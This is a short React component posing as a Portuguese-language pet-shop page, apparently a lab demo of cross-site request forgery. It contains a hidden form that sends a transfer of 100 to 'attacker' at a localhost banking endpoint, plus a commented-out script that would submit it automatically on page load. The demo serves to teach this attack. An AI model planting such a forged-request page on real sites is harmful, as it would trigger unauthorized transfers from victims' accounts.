export default async function Users() {
    return (
        <div>
            <h1>Loja de acessórios pet</h1>
            <a href="">Clique nos produtos</a>
            <p>Nossos produtos pet de alta qualidade!</p>

            <form action="http://localhost:3333/transferir">
                <input type="hidden" name="recipient" value="attacker" />
                <input type="hidden" name="amount" value="100" />
            </form>  
            
            {/* <script>
                const form = document.querySelector('form')
                form.submit();
            </script> */}
        </div>
    )
}